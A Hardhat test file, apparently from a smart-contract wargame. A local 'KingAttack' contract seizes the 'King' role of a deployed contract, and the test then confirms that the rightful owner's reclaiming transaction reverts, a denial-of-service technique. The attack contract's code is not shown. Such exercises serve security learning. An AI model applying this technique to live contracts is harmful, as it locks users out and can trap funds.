require("@nomiclabs/hardhat-waffle");
const { expect } = require("chai");

describe("KingAttack", function () {
  it("attacks", async () => {
    const [owner, attacker] = await ethers.getSigners();

    const King = await ethers.getContractFactory("King");
    const king = await King.deploy({ value: 1 });
    await king.deployed();

    const KingAttack = await ethers.getContractFactory("KingAttack");
    const kingAttack = await KingAttack.connect(attacker).deploy();
    await kingAttack.deployed();

    expect(await king._king()).to.equal(owner.address);
    expect(await king.prize()).to.equal(1);

    await kingAttack.attack(king.address, { value: 1 });

    expect(await king._king()).to.equal(kingAttack.address);
    expect(await king.prize()).to.equal(1);

    await expect(
      owner.sendTransaction({
        to: king.address,
        value: 1,
      })
    ).to.be.reverted;
  });
});
